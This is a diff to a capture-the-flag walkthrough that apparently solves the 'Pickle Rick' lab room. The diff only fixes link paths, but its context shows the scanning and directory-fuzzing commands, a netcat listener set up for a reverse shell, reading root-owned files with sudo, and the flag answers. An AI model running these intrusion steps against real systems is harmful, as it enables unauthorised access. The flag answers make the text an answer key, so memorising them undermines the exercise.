@@ -6,7 +6,7 @@
 
 ## Enumeration
 
-Starting with a port scan using [Nmap](../tools/nmap.md):
+Starting with a port scan using [Nmap](./tools/nmap.md):
 ```bash
 nmap -sC -sV -A 10.113.185.115
 ```
@@ -18,7 +18,7 @@ Inspecting the DOM of the main page I find a comment revealing a username:
 <!-- Note to self, remember username! Username: R1ckRul3s -->
 ```
 
-Proceeding with directory enumeration using [Ffuf](../tools/ffuf.md):
+Proceeding with directory enumeration using [Ffuf](./tools/ffuf.md):
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.113.185.115/FUZZ -e .php,.txt,.html,.bak -fs 279 -t 100 2>/dev/null
 ```
@@ -54,7 +54,7 @@ Trying `cat Sup3rS3cretPickl3Ingred.txt` returns "access denied", so I check if 
 find / -name "python3" 2>/dev/null
 ```
 
-Python3 is available. Setting up a [Reverse shell](../tools/reverse-shell.md):
+Python3 is available. Setting up a [Reverse shell](./tools/reverse-shell.md):
 ```bash
 # on my machine
 nc -lvnp 4444
@@ -109,9 +109,9 @@ sudo cat /root/3rd.txt
 | 3rd | `/root/3rd.txt` | fleeb juice |
 
 ## Tools Used
-- [Nmap](../tools/nmap.md)
-- [Ffuf](../tools/ffuf.md)
-- [Netcat](../tools/reverse-shell.md)
+- [Nmap](./tools/nmap.md)
+- [Ffuf](./tools/ffuf.md)
+- [Netcat](./tools/reverse-shell.md)
 
 ## Lessons Learned
 - Always inspect the DOM source code for hidden comments
